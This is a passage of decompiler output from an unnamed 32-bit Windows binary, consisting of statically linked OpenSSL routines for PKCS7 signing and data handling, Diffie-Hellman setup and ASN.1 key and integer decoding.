        sub_405390(v34, 130, 0, 0);
        goto LABEL_49;
      }
      v32 = sub_4067F0(*(const char **)(v42 + 8), *(_DWORD *)v42);
    }
    v36 = v32;
    if ( v32 )
      goto LABEL_49;
    goto LABEL_47;
  }
LABEL_49:
  if ( Block )
  {
    sub_4054B0(Block, (int)v36);
    return Block;
  }
  else
  {
    result = v36;
    Block = v36;
  }
  return result;
}
// 433780: using guessed type char Src[16];
// 433780: using guessed type _BYTE var_44[64];

//----- (00433BF0) --------------------------------------------------------
int *__usercall sub_433BF0@<eax>(int a1@<ebx>, int *a2@<edi>, int **a3)
{
  int *v3; // esi
  int v4; // eax
  int **v5; // eax

  v3 = sub_405500(a3, 520);
  if ( v3 )
  {
    while ( 1 )
    {
      sub_405390(v3, 120, 0, (int)a2);
      if ( !*a2 )
      {
        sub_408310(33, 127, 68, (int)"crypto\\pkcs7\\pk7_doit.c", 599);
        return 0;
      }
      v4 = sub_445DB0(*a2);
      if ( sub_435D30(v4) == a1 )
        return v3;
      v5 = (int **)sub_405540((int)v3);
      v3 = sub_405500(v5, 520);
      if ( !v3 )
        goto LABEL_5;
    }
  }
  else
  {
LABEL_5:
    sub_408310(33, 127, 108, (int)"crypto\\pkcs7\\pk7_doit.c", 594);
    return 0;
  }
}

//----- (00433C90) --------------------------------------------------------
int __cdecl sub_433C90(size_t Size)
{
  int *v1; // esi
  int *v2; // eax
  int v3; // eax
  char *v4; // eax
  int result; // eax
  int *v6; // ebx
  _BYTE *v7; // edi
  void *v8; // eax
  void *v9; // eax
  int v10; // [esp-8h] [ebp-18h]
  void *Block; // [esp+8h] [ebp-8h] BYREF
  int v12; // [esp+Ch] [ebp-4h] BYREF

  v1 = (int *)Size;
  v2 = *(int **)(Size + 8);
  Block = 0;
  v3 = sub_423680(*v2);
  v4 = sub_4233A0(v3);
  result = sub_430D80((int)v4);
  v6 = (int *)result;
  if ( result )
  {
    v7 = sub_42B820();
    if ( !v7 )
    {
      sub_408310(33, 139, 65, (int)"crypto\\pkcs7\\pk7_doit.c", 828);
LABEL_15:
      sub_413490(Block);
      sub_42B840(v7);
      return 0;
    }
    if ( sub_44FE10((int)v7, &v12, v6, 0, v1[7]) <= 0 )
      goto LABEL_15;
    if ( sub_443A60(v12, -1, 8, 5, 0, (int)v1) <= 0 )
    {
      v10 = 837;
LABEL_14:
      sub_408310(33, 139, 152, (int)"crypto\\pkcs7\\pk7_doit.c", v10);
      goto LABEL_15;
    }
    v8 = sub_41CA30();
    sub_42F620(v1[3], &Block, (int)v8);
    if ( !Block )
      goto LABEL_15;
    if ( sub_42BA10((int)v7) <= 0 )
      goto LABEL_15;
    sub_413490(Block);
    Block = 0;
    if ( sub_44FE70((int)v7, 0, &Size) <= 0 )
      goto LABEL_15;
    v9 = sub_4133F0(Size);
    Block = v9;
    if ( !v9 || sub_44FE70((int)v7, (int)v9, &Size) <= 0 )
      goto LABEL_15;
    if ( sub_443A60(v12, -1, 8, 5, 1, (int)v1) <= 0 )
    {
      v10 = 859;
      goto LABEL_14;
    }
    sub_42B840(v7);
    sub_4329C0(v1[5], (int)Block, Size);
    return 1;
  }
  return result;
}

//----- (00433E50) --------------------------------------------------------
int __cdecl sub_433E50(unsigned int a1, int a2, int a3)
{
  int *v3; // ecx
  int **v4; // edi
  int *v5; // eax
  int v7; // esi
  int v8; // ebx
  int v9; // eax
  char ***v10; // eax
  int v11; // esi
  char ***v12; // eax
  int v13; // ebx

  v4 = (int **)v3;
  if ( !*v3 )
  {
    v5 = sub_426AF0();
    *v4 = v5;
    if ( !v5 )
      return 0;
LABEL_7:
    v10 = sub_42C8B0(a1, a2, a3);
    v11 = (int)v10;
    if ( !v10 )
      return 0;
    if ( !sub_4269B0(*v4, (int)v10) )
    {
      sub_42C870(v11);
      return 0;
    }
    return 1;
  }
  v7 = 0;
  if ( sub_426A30(*v3) <= 0 )
    goto LABEL_7;
  while ( 1 )
  {
    v8 = sub_426A40(*v4, v7);
    v9 = sub_445DB0(v8);
    if ( sub_423680(v9) == a1 )
      break;
    if ( ++v7 >= sub_426A30((int)*v4) )
      goto LABEL_7;
  }
  sub_42C870(v8);
  v12 = sub_42C8B0(a1, a2, a3);
  v13 = (int)v12;
  if ( !v12 )
    return 0;
  if ( !sub_426A60(*v4, v7, (int)v12) )
  {
    sub_42C870(v13);
    return 0;
  }
  return 1;
}
// 433E58: variable 'v3' is possibly undefined

//----- (00433F40) --------------------------------------------------------
int __cdecl sub_433F40(int a1, unsigned int a2, int a3, int a4)
{
  return sub_433E50(a2, a3, a4);
}

//----- (00433F60) --------------------------------------------------------
BOOL __usercall sub_433F60@<eax>(_BYTE **a1@<ebx>, size_t a2@<edi>)
{
  int *v2; // esi
  int v3; // eax
  int v4; // eax
  int v6; // [esp+0h] [ebp-4Ch]
  size_t Size; // [esp+4h] [ebp-48h] BYREF
  char Src[64]; // [esp+8h] [ebp-44h] BYREF

  v2 = *(int **)(a2 + 12);
  v3 = sub_431A00(v2, 0x34u, -1);
  v4 = sub_4319A0(v2, v3);
  if ( !sub_454B50(v4, 0) && !sub_454CE0(a2, 0) )
  {
    v6 = 617;
LABEL_4:
    sub_408310(33, 136, 65, (int)"crypto\\pkcs7\\pk7_doit.c", v6);
    return 0;
  }
  if ( !sub_42BA20(a1, (int)Src, &Size) )
  {
    sub_408310(33, 136, 6, (int)"crypto\\pkcs7\\pk7_doit.c", 624);
    return 0;
  }
  if ( !sub_454D30(a2, Src, Size) )
  {
    v6 = 628;
    goto LABEL_4;
  }
  return sub_433C90(a2) != 0;
}

//----- (00434040) --------------------------------------------------------
int __cdecl sub_434040(_DWORD *a1, int **a2)
{
  int result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // ecx
  _BYTE *v6; // eax
  _DWORD *v7; // eax
  int *v8; // ebx
  int v9; // esi
  int v10; // eax
  int *v11; // esi
  int v12; // eax
  _DWORD *v13; // eax
  int v14; // eax
  int v15; // esi
  void *v16; // edi
  int v17; // eax
  int *v18; // eax
  int *v19; // esi
  int v20; // edi
  _BYTE *Block; // [esp+8h] [ebp-64h]
  size_t Size; // [esp+Ch] [ebp-60h] BYREF
  void *v23; // [esp+10h] [ebp-5Ch]
  int **v24; // [esp+14h] [ebp-58h]
  _BYTE **v25; // [esp+18h] [ebp-54h] BYREF
  int *v26; // [esp+1Ch] [ebp-50h]
  int v27; // [esp+20h] [ebp-4Ch]
  int v28; // [esp+24h] [ebp-48h] BYREF
  char Src[64]; // [esp+28h] [ebp-44h] BYREF

  v24 = a2;
  v27 = 0;
  if ( !a1 )
  {
    sub_408310(33, 128, 143, (int)"crypto\\pkcs7\\pk7_doit.c", 651);
    return 0;
  }
  if ( !a1[5] )
  {
    sub_408310(33, 128, 122, (int)"crypto\\pkcs7\\pk7_doit.c", 656);
    return 0;
  }
  v23 = sub_42B820();
  if ( !v23 )
  {
    sub_408310(33, 128, 65, (int)"crypto\\pkcs7\\pk7_doit.c", 662);
    return 0;
  }
  v3 = sub_423680(a1[4]);
  a1[2] = 0;
  switch ( v3 )
  {
    case 21:
      Block = (_BYTE *)a1[5];
      goto LABEL_38;
    case 22:
      v14 = a1[5];
      v15 = *(_DWORD *)(v14 + 20);
      v26 = *(int **)(v14 + 16);
      Block = (_BYTE *)sub_433580(v15);
      if ( sub_423680(*(_DWORD *)(*(_DWORD *)(a1[5] + 20) + 16)) == 21 && a1[3] )
      {
        sub_42C4F0(Block);
        Block = 0;
        *(_DWORD *)(*(_DWORD *)(a1[5] + 20) + 20) = 0;
      }
      goto LABEL_14;
    case 23:
      Block = *(_BYTE **)(*(_DWORD *)(a1[5] + 8) + 8);
      if ( Block )
        goto LABEL_38;
      v13 = sub_42C430();
      Block = v13;
      if ( !v13 )
      {
        sub_408310(33, 128, 65, (int)"crypto\\pkcs7\\pk7_doit.c", 692);
        goto LABEL_51;
      }
      *(_DWORD *)(*(_DWORD *)(a1[5] + 8) + 8) = v13;
      goto LABEL_38;
    case 24:
      v4 = a1[5];
      v5 = *(_DWORD *)(v4 + 16);
      v6 = *(_BYTE **)(*(_DWORD *)(v4 + 20) + 8);
      v26 = (int *)v5;
      Block = v6;
      if ( v6 )
        goto LABEL_14;
      v7 = sub_42C430();
      Block = v7;
      if ( !v7 )
      {
        sub_408310(33, 128, 65, (int)"crypto\\pkcs7\\pk7_doit.c", 680);
        goto LABEL_51;
      }
      *(_DWORD *)(*(_DWORD *)(a1[5] + 20) + 8) = v7;
LABEL_14:
      v8 = v26;
      if ( v26 )
      {
        v9 = 0;
        for ( Size = 0; (int)Size < sub_426A30((int)v26); v9 = Size )
        {
          v10 = sub_426A40(v8, v9);
          v11 = (int *)v10;
          if ( *(_DWORD *)(v10 + 28) )
          {
            v12 = sub_423680(**(_DWORD **)(v10 + 8));
            if ( !sub_433BF0(v12, (int *)&v25, v24) || !sub_42BAA0((int)v23, (int)v25) )
              goto LABEL_51;
            if ( sub_426A30(v11[3]) <= 0 )
            {
              v28 = sub_41CA90(v11[7]);
              v16 = sub_4133F0(v28);
              if ( !v16 )
                goto LABEL_51;
              if ( !sub_454D80((_BYTE **)v23, (int)v16, &v28, v11[7]) )
              {
                sub_413490(v16);
                sub_408310(33, 128, 6, (int)"crypto\\pkcs7\\pk7_doit.c", 764);
                goto LABEL_51;
              }
              sub_4329C0(v11[5], (int)v16, v28);
            }
            else if ( !sub_433F60((_BYTE **)v23, (size_t)v11) )
            {
              goto LABEL_51;
            }
          }
          v8 = v26;
          ++Size;
        }
      }
      else
      {
LABEL_38:
        if ( v3 == 25 )
        {
          v17 = sub_423680(**(_DWORD **)(a1[5] + 4));
          if ( !sub_433BF0(v17, (int *)&v25, v24)
            || !sub_42BA20(v25, (int)Src, &Size)
            || !sub_437A10(*(_DWORD *)(a1[5] + 12), Src, Size) )
          {
            goto LABEL_51;
          }
        }
      }
      if ( sub_423680(a1[4]) != 22 || !sub_4344E0(a1, 2, 0) )
      {
        if ( !Block )
          goto LABEL_51;
        if ( (Block[12] & 0x10) == 0 )
        {
          v18 = sub_405500(v24, 1025);
          v19 = v18;
          if ( !v18 )
          {
            sub_408310(33, 128, 107, (int)"crypto\\pkcs7\\pk7_doit.c", 794);
            goto LABEL_51;
          }
          v20 = sub_405390(v18, 3, 0, (int)&Size);
          sub_405030((int)v19, 512);
          sub_405390(v19, 130, 0, 0);
          sub_4329C0((int)Block, Size, v20);
        }
      }
      v27 = 1;
LABEL_51:
      sub_42B840(v23);
      result = v27;
      break;
    case 25:
      Block = (_BYTE *)sub_433580(*(_DWORD *)(a1[5] + 8));
      if ( sub_423680(*(_DWORD *)(*(_DWORD *)(a1[5] + 8) + 16)) == 21 && a1[3] )
      {
        sub_42C4F0(Block);
        Block = 0;
        *(_DWORD *)(*(_DWORD *)(a1[5] + 8) + 20) = 0;
      }
      goto LABEL_38;
    default:
      sub_408310(33, 128, 112, (int)"crypto\\pkcs7\\pk7_doit.c", 720);
      goto LABEL_51;
  }
  return result;
}

//----- (004344E0) --------------------------------------------------------
int __cdecl sub_4344E0(_DWORD *a1, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  int v5; // eax

  v3 = sub_423680(a1[4]);
  if ( a2 != 1 )
  {
    if ( a2 != 2 )
    {
      sub_408310(33, 104, 110, (int)"crypto\\pkcs7\\pk7_lib.c", 57);
      return 0;
    }
    if ( v3 == 22 )
    {
      v5 = a1[5];
      if ( v5 && *(_DWORD *)(*(_DWORD *)(v5 + 20) + 20) )
      {
        result = 0;
        a1[3] = 0;
      }
      else
      {
        result = 1;
        a1[3] = 1;
      }
      return result;
    }
    sub_408310(33, 104, 104, (int)"crypto\\pkcs7\\pk7_lib.c", 51);
    return 0;
  }
  if ( v3 != 22 )
  {
    sub_408310(33, 104, 104, (int)"crypto\\pkcs7\\pk7_lib.c", 37);
    return 0;
  }
  a1[3] = a3;
  if ( a3 && sub_423680(*(_DWORD *)(*(_DWORD *)(a1[5] + 20) + 16)) == 21 )
  {
    sub_42C4F0(*(void **)(*(_DWORD *)(a1[5] + 20) + 20));
    *(_DWORD *)(*(_DWORD *)(a1[5] + 20) + 20) = 0;
  }
  return a3;
}

//----- (004345B0) --------------------------------------------------------
_DWORD *__cdecl sub_4345B0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  _DWORD *result; // eax

  if ( a2 )
    *a2 = a1[7];
  if ( a3 )
    *a3 = a1[2];
  result = a4;
  if ( a4 )
    *a4 = a1[4];
  return result;
}

//----- (004345E0) --------------------------------------------------------
_DWORD *__cdecl sub_4345E0(int a1, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  if ( a2 )
    *a2 = *(_DWORD *)(a1 + 8);
  return result;
}

//----- (00434600) --------------------------------------------------------
int __cdecl sub_434600(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax

  switch ( sub_423680(*(_DWORD *)(a2 + 16)) )
  {
    case 21:
      v2 = *(_DWORD **)(a2 + 20);
      break;
    case 22:
      v2 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(a2 + 20) + 20) + 20);
      break;
    case 23:
      v2 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(a2 + 20) + 8) + 8);
      if ( v2 )
        goto LABEL_10;
      v2 = sub_42C430();
      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a2 + 20) + 8) + 8) = v2;
      break;
    case 24:
      v2 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(a2 + 20) + 20) + 8);
      if ( v2 )
        goto LABEL_10;
      v2 = sub_42C430();
      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a2 + 20) + 20) + 8) = v2;
      break;
    default:
      return 0;
  }
  if ( !v2 )
    return 0;
LABEL_10:
  v2[3] |= 0x10u;
  *a1 = v2 + 2;
  return 1;
}

//----- (004346A0) --------------------------------------------------------
char **sub_4346A0()
{
  char **result; // eax

  result = (char **)dword_539094;
  if ( !dword_539094 )
  {
    result = sub_455A50();
    dword_539094 = (int)result;
  }
  return result;
}
// 539094: using guessed type int dword_539094;

//----- (004346C0) --------------------------------------------------------
void __cdecl sub_4346C0(volatile LONG *Block)
{
  volatile LONG *v1; // esi
  void (__cdecl *v2)(volatile LONG *); // eax

  v1 = Block;
  if ( Block )
  {
    sub_4147E0(Block + 14, -1, &Block);
    if ( (int)Block <= 0 )
    {
      v2 = *(void (__cdecl **)(volatile LONG *))(*((_DWORD *)v1 + 16) + 20);
      if ( v2 )
        v2(v1);
      sub_4162A0(*((volatile LONG **)v1 + 17));
      sub_414DC0(6u, (int)v1, (int **)v1 + 15);
      sub_4146D0(*((LPCRITICAL_SECTION *)v1 + 18));
      sub_417000(*((_DWORD **)v1 + 2));
      sub_417000(*((_DWORD **)v1 + 3));
      sub_417000(*((_DWORD **)v1 + 9));
      sub_417000(*((_DWORD **)v1 + 10));
      sub_413490(*((void **)v1 + 11));
      sub_417000(*((_DWORD **)v1 + 13));
      sub_417000(*((_DWORD **)v1 + 5));
      sub_417000(*((_DWORD **)v1 + 6));
      sub_413490((void *)v1);
    }
  }
}

//----- (00434790) --------------------------------------------------------
int __cdecl sub_434790(int a1)
{
  return (sub_416F90(*(_DWORD **)(a1 + 8)) + 7) / 8;
}

//----- (004347F0) --------------------------------------------------------
int __cdecl sub_4347F0(int a1, int a2, _DWORD *a3, int a4)
{
  if ( !*(_DWORD *)(a1 + 8) && !a2 || !*(_DWORD *)(a1 + 12) && !a4 )
    return 0;
  if ( a2 )
  {
    sub_417060(*(void ***)(a1 + 8));
    *(_DWORD *)(a1 + 8) = a2;
  }
  if ( a3 )
  {
    sub_417060(*(void ***)(a1 + 36));
    *(_DWORD *)(a1 + 36) = a3;
  }
  if ( a4 )
  {
    sub_417060(*(void ***)(a1 + 12));
    *(_DWORD *)(a1 + 12) = a4;
  }
  if ( a3 )
    *(_DWORD *)(a1 + 16) = sub_416F90(a3);
  return 1;
}

//----- (00434870) --------------------------------------------------------
int __cdecl sub_434870(_DWORD *a1)
{
  _DWORD *v1; // eax
  int v2; // esi
  struct _RTL_CRITICAL_SECTION *v4; // eax
  char **v5; // eax
  int v6; // eax
  int (__cdecl *v7)(int); // eax

  v1 = sub_413430(0x4Cu);
  v2 = (int)v1;
  if ( !v1 )
  {
    sub_408310(5, 105, 65, (int)"crypto\\dh\\dh_lib.c", 60);
    return 0;
  }
  v1[14] = 1;
  v4 = sub_414650();
  *(_DWORD *)(v2 + 72) = v4;
  if ( !v4 )
  {
    sub_408310(5, 105, 65, (int)"crypto\\dh\\dh_lib.c", 67);
    sub_413490((void *)v2);
    return 0;
  }
  v5 = (char **)dword_539094;
  if ( !dword_539094 )
  {
    v5 = sub_455A50();
    dword_539094 = (int)v5;
  }
  *(_DWORD *)(v2 + 64) = v5;
  *(_DWORD *)(v2 + 28) = v5[6];
  if ( a1 )
  {
    if ( !sub_416200(a1) )
    {
      sub_408310(5, 105, 38, (int)"crypto\\dh\\dh_lib.c", 77);
      goto LABEL_19;
    }
    *(_DWORD *)(v2 + 68) = a1;
  }
  else
  {
    *(_DWORD *)(v2 + 68) = sub_455E20();
  }
  if ( !*(_DWORD *)(v2 + 68) || (v6 = _fileno(*(FILE **)(v2 + 68)), (*(_DWORD *)(v2 + 64) = v6) != 0) )
  {
    *(_DWORD *)(v2 + 28) = *(_DWORD *)(*(_DWORD *)(v2 + 64) + 24);
    if ( sub_414B00(6u, v2, (int **)(v2 + 60)) )
    {
      v7 = *(int (__cdecl **)(int))(*(_DWORD *)(v2 + 64) + 16);
      if ( !v7 || v7(v2) )
        return v2;
      sub_408310(5, 105, 70, (int)"crypto\\dh\\dh_lib.c", 98);
    }
  }
  else
  {
    sub_408310(5, 105, 38, (int)"crypto\\dh\\dh_lib.c", 86);
  }
LABEL_19:
  sub_4346C0((volatile LONG *)v2);
  return 0;
}
// 539094: using guessed type int dword_539094;

//----- (004349A0) --------------------------------------------------------
int sub_4349A0()
{
  return sub_434870(0);
}

//----- (004349B0) --------------------------------------------------------
volatile LONG *__cdecl sub_4349B0(void *a1, volatile LONG **a2, void **a3, int a4)
{
  volatile LONG *v4; // esi
  int (__cdecl *v6)(volatile LONG *, void **, int); // eax
  int v7; // eax
  int v8; // edi
  int v9; // ebx
  void *v10; // [esp+8h] [ebp-4h] BYREF

  v10 = *a3;
  if ( a2 && (v4 = *a2) != 0 )
  {
    sub_4162A0(*((volatile LONG **)v4 + 4));
    *((_DWORD *)v4 + 4) = 0;
  }
  else
  {
    v4 = sub_41CB00();
    if ( !v4 )
    {
      sub_408310(13, 154, 6, (int)"crypto\\asn1\\d2i_pr.c", 29);
      return 0;
    }
  }
  if ( !sub_41CE00((int)v4, a1) )
  {
    sub_408310(13, 154, 163, (int)"crypto\\asn1\\d2i_pr.c", 41);
    goto LABEL_18;
  }
  v6 = *(int (__cdecl **)(volatile LONG *, void **, int))(*((_DWORD *)v4 + 3) + 96);
  if ( !v6 || !v6(v4, &v10, a4) )
  {
    if ( !*(_DWORD *)(*((_DWORD *)v4 + 3) + 36) )
    {
      sub_408310(13, 154, 13, (int)"crypto\\asn1\\d2i_pr.c", 60);
LABEL_18:
      if ( !a2 || *a2 != v4 )
        sub_41CEB0(v4);
      return 0;
    }
    v7 = sub_434B20(0, &v10, a4);
    v8 = v7;
    if ( !v7 )
      goto LABEL_18;
    v9 = sub_434C20(v7);
    sub_434B40(v8);
    if ( !v9 )
      goto LABEL_18;
    sub_41CEB0(v4);
    v4 = (volatile LONG *)v9;
  }
  *a3 = v10;
  if ( a2 )
    *a2 = v4;
  return v4;
}

//----- (00434AE0) --------------------------------------------------------
int __cdecl sub_434AE0(int a1, int a2)
{
  if ( a1 == 2 && *(_DWORD *)(*(_DWORD *)a2 + 8) )
    sub_4139E0(*(_BYTE **)(*(_DWORD *)(*(_DWORD *)a2 + 8) + 8), **(_DWORD **)(*(_DWORD *)a2 + 8));
  return 1;
}

//----- (00434B10) --------------------------------------------------------
void *sub_434B10()
{
  return &unk_5068A0;
}

//----- (00434B20) --------------------------------------------------------
int __cdecl sub_434B20(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_5068A0);
}

//----- (00434B40) --------------------------------------------------------
void __cdecl sub_434B40(int a1)
{
  sub_42FEF0(a1, (int)&unk_5068A0);
}

//----- (00434B60) --------------------------------------------------------
int __cdecl sub_434B60(int *a1, int a2, int a3, int a4, int a5, int a6, int a7)
{
  if ( a3 >= 0 && !sub_431840(*a1, a3) || !sub_42C750(a1[1], a2, a4, a5) )
    return 0;
  if ( a6 )
    sub_4329C0(a1[2], a6, a7);
  return 1;
}

//----- (00434BD0) --------------------------------------------------------
int __cdecl sub_434BD0(_DWORD *a1, int *a2, int *a3, _DWORD *a4, int a5)
{
  if ( a1 )
    *a1 = **(_DWORD **)(a5 + 4);
  if ( a2 )
  {
    *a2 = sub_432B60(*(_DWORD *)(a5 + 8));
    *a3 = sub_435D30(*(_DWORD *)(a5 + 8));
  }
  if ( a4 )
    *a4 = *(_DWORD *)(a5 + 4);
  return 1;
}

//----- (00434C20) --------------------------------------------------------
int __cdecl sub_434C20(int a1)
{
  int result; // eax
  volatile LONG *v2; // esi
  void *v3; // eax
  int (__cdecl *v4)(volatile LONG *, int); // eax
  int v5; // [esp+4h] [ebp-58h] BYREF
  char v6[80]; // [esp+8h] [ebp-54h] BYREF

  result = sub_434BD0(&v5, 0, 0, 0, a1);
  if ( result )
  {
    v2 = sub_41CB00();
    if ( !v2 )
    {
      sub_408310(6, 111, 65, (int)"crypto\\evp\\evp_pkey.c", 31);
      return 0;
    }
    v3 = (void *)sub_423680(v5);
    if ( sub_41CE00((int)v2, v3) )
    {
      v4 = *(int (__cdecl **)(volatile LONG *, int))(*((_DWORD *)v2 + 3) + 36);
      if ( v4 )
      {
        if ( v4(v2, a1) )
          return (int)v2;
        sub_408310(6, 111, 145, (int)"crypto\\evp\\evp_pkey.c", 44);
      }
      else
      {
        sub_408310(6, 111, 144, (int)"crypto\\evp\\evp_pkey.c", 48);
      }
    }
    else
    {
      sub_408310(6, 111, 118, (int)"crypto\\evp\\evp_pkey.c", 36);
      sub_4229E0(v6, 80, v5);
      sub_408610(2, "TYPE=", v6);
    }
    sub_41CEB0(v2);
    return 0;
  }
  return result;
}

//----- (00434D60) --------------------------------------------------------
int __cdecl sub_434D60(_DWORD *a1, const char *a2, int a3)
{
  void *v3; // eax
  char **v5; // [esp-8h] [ebp-10h]
  void *Block; // [esp+0h] [ebp-8h] BYREF
  int v7; // [esp+4h] [ebp-4h] BYREF

  sub_434E20(a1, &v7, &Block);
  v5 = (char **)Block;
  v3 = sub_434B10();
  return sub_455FD0((int *)v7, (int)v3, a2, a3, v5, 1);
}

//----- (00434DB0) --------------------------------------------------------
void *sub_434DB0()
{
  return &unk_506910;
}

//----- (00434DC0) --------------------------------------------------------
int __cdecl sub_434DC0(int *a1, void **a2, int a3)
{
  return sub_42E9C0(a1, a2, a3, (int)&unk_506910);
}

//----- (00434DE0) --------------------------------------------------------
signed int __cdecl sub_434DE0(int a1, void **a2)
{
  return sub_42F620(a1, a2, (int)&unk_506910);
}

//----- (00434E00) --------------------------------------------------------
void __cdecl sub_434E00(int a1)
{
  sub_42FEF0(a1, (int)&unk_506910);
}

//----- (00434E20) --------------------------------------------------------
_DWORD *__cdecl sub_434E20(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *result; // eax

  if ( a2 )
    *a2 = *a1;
  result = a3;
  if ( a3 )
    *a3 = a1[1];
  return result;
}

//----- (00434E40) --------------------------------------------------------
void *sub_434E40()
{
  return &unk_50693C;
}

//----- (00434E50) --------------------------------------------------------
void *sub_434E50()
{
  return &unk_506958;
}

//----- (00434E60) --------------------------------------------------------
BOOL __cdecl sub_434E60(_DWORD *a1)
{
  _DWORD *v1; // eax

  v1 = sub_4168C0();
  *a1 = v1;
  return v1 != 0;
}

//----- (00434E80) --------------------------------------------------------
BOOL __cdecl sub_434E80(_DWORD *a1)
{
  _DWORD *v1; // eax

  v1 = sub_416900();
  *a1 = v1;
  return v1 != 0;
}

//----- (00434EA0) --------------------------------------------------------
void __cdecl sub_434EA0(void ***a1, int a2)
{
  void **v2; // [esp-4h] [ebp-8h]

  if ( *a1 )
  {
    v2 = *a1;
    if ( (*(_BYTE *)(a2 + 20) & 1) != 0 )
      sub_417000(v2);
    else
      sub_417060(v2);
    *a1 = 0;
  }
}

//----- (00434EE0) --------------------------------------------------------
int __cdecl sub_434EE0(_DWORD **a1, char *a2)
{
  _DWORD *v2; // esi
  bool v4; // zf
  char *v5; // eax
  BOOL v6; // edi

  v2 = *a1;
  if ( !*a1 )
    return -1;
  v4 = (sub_416F90(v2) & 7) == 0;
  v5 = a2;
  v6 = v4;
  if ( a2 )
  {
    if ( v4 )
    {
      *a2 = 0;
      v5 = a2 + 1;
    }
    sub_417300(v2, v5);
  }
  return v6 + (sub_416F90(v2) + 7) / 8;
}

//----- (00434F40) --------------------------------------------------------
int __cdecl sub_434F40(int *a1, _BYTE *a2, int a3, int a4, int a5, int a6)
{
  _DWORD *v6; // eax
  void **v8; // [esp-4h] [ebp-8h]

  if ( !*a1 )
  {
    v6 = sub_4168C0();
    *a1 = (int)v6;
    if ( !v6 )
      return 0;
  }
  if ( !sub_4174D0(a2, a3, *a1) )
  {
    if ( *a1 )
    {
      v8 = (void **)*a1;
      if ( (*(_BYTE *)(a6 + 20) & 1) != 0 )
      {
        sub_417000(v8);
        *a1 = 0;
        return 0;
      }
      sub_417060(v8);
      *a1 = 0;
    }
    return 0;
  }
  return 1;
}

//----- (00434FB0) --------------------------------------------------------
int __cdecl sub_434FB0(int *a1, _BYTE *a2, int a3, int a4, int a5, int a6)
{
  if ( !*a1 )
    *a1 = (int)sub_416900();
  return sub_434F40(a1, a2, a3, a4, a5, a6);
}

//----- (00434FF0) --------------------------------------------------------
int __cdecl sub_434FF0(int a1, _DWORD **a2)
{
  int result; // eax

  result = sub_43A610(a1, *a2);
  if ( result )
    return sub_4051D0(a1, (int)"\n") > 0;
  return result;
}

//----- (00435030) --------------------------------------------------------
void *sub_435030()
{
  return &unk_506984;
}

//----- (00435040) --------------------------------------------------------
void *sub_435040()
{
  return &unk_5069A0;
}

//----- (00435050) --------------------------------------------------------
int __cdecl sub_435050(_DWORD *a1, int a2)
{
  *a1 = *(_DWORD *)(a2 + 20);
  return 1;
}

//----- (00435070) --------------------------------------------------------
int __cdecl sub_435070(_DWORD *a1, int a2)
{
  int result; // eax

  result = a2;
  *a1 = *(_DWORD *)(a2 + 20);
  return result;
}

//----- (00435080) --------------------------------------------------------
int __cdecl sub_435080(int *a1, _BYTE *a2, int a3, int a4)
{
  int v4; // edi
  unsigned int v6; // ebx
  int v7; // eax
  _BYTE *v8; // esi
  BOOL v9; // ecx
  int v10; // ebp
  int i; // eax

  v4 = *a1;
  if ( *a1 == *(_DWORD *)(a4 + 20) )
    return -1;
  if ( v4 >= 0 )
    v6 = *a1;
  else
    v6 = -1 - v4;
  v7 = sub_416830(v6);
  v8 = a2;
  v9 = (v7 & 7) == 0;
  v10 = (v7 + 7) >> 3;
  if ( a2 )
  {
    if ( (v7 & 7) == 0 )
    {
      *a2 = (v4 >= 0) - 1;
      v8 = a2 + 1;
    }
    for ( i = v10 - 1; i >= 0; --i )
    {
      v8[i] = v6;
      if ( v4 < 0 )
        v8[i] = ~(_BYTE)v6;
      v6 >>= 8;
    }
  }
  return v9 + v10;
}

//----- (00435100) --------------------------------------------------------
int __cdecl sub_435100(int *a1, char *a2, int a3, int a4, int a5, int a6)
{
  BOOL v7; // ebp
  int v8; // ecx
  int i; // eax
  int v10; // ecx
  int v11; // edx
  int v12; // eax

  if ( a3 > 4 )
  {
    sub_408310(13, 166, 128, (int)"crypto\\asn1\\x_long.c", 113);
    return 0;
  }
  v7 = a3 && *a2 < 0;
  v8 = 0;
  for ( i = 0; i < a3; v8 = v11 | v10 )
  {
    v10 = v8 << 8;
    if ( v7 )
      v11 = (unsigned __int8)~a2[i];
    else
      v11 = (unsigned __int8)a2[i];
    ++i;
  }
  v12 = v8;
  if ( v7 )
    v12 = -1 - v8;
  if ( v12 == *(_DWORD *)(a6 + 20) )
  {
    sub_408310(13, 166, 128, (int)"crypto\\asn1\\x_long.c", 135);
    return 0;
  }
  *a1 = v12;
  return 1;
}

//----- (004351A0) --------------------------------------------------------
int __cdecl sub_4351A0(int a1, _DWORD *a2)
{
  return sub_419190(a1, "%ld\n", *a2);
}

//----- (004351C0) --------------------------------------------------------
char **sub_4351C0()
{
  return &off_5313C4;
}
// 5313C4: using guessed type char *off_5313C4;

//----- (004351D0) --------------------------------------------------------
int __usercall sub_4351D0@<eax>(
        int a1@<ecx>,
        __m64 a2@<mm0>,
        int *Block,
        void ***a4,
        unsigned int **a5,
        void *a6,
        size_t Size)
{
  int *v8; // ebx
  _DWORD *v9; // edi
  int v11; // ebp
  int (__cdecl *v12)(int, unsigned int *, _DWORD, _DWORD *, _DWORD, int *, _DWORD); // eax
  void **v14; // esi
  int v15; // esi
  unsigned int *v17; // [esp+1Ch] [ebp+Ch]

  v8 = 0;
  v17 = *a5;
  if ( *(_DWORD *)(a1 + 8) && *(_DWORD *)(a1 + 12) && *(_DWORD *)(a1 + 16) )
  {
    v9 = sub_4168C0();
    if ( v9 )
    {
      v8 = Block;
      if ( Block || (v8 = sub_420670()) != 0 )
      {
        while ( a6
              ? sub_42A9B0(v9, *(int **)(a1 + 12), *(_DWORD *)(a1 + 24), a6, Size, v8)
              : sub_42A970(v9, *(_DWORD **)(a1 + 12)) )
        {
          if ( !sub_416DB0((int)v9) )
          {
            sub_416F20((int)v9, 4);
            if ( (*(_BYTE *)(a1 + 28) & 1) == 0
